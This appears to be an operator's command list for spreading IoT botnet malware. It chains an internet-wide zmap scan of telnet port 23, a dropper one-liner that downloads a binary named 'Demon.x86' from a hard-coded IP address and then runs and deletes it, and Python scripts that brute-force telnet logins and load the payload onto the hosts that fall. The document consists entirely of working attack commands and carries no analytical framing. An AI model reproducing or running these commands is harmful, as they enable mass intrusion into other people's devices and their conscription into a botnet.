zmap -p23 -o ips.txt -w x4.lst && ulimit -n 999999
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://107.175.247.196/Demon.x86; chmod +x Demon.x86; ./Demon.x86; rm -rf Demon.x86
python xbruter.py ips.txt 2000 vuln.txt
python xloader.py vuln.txt
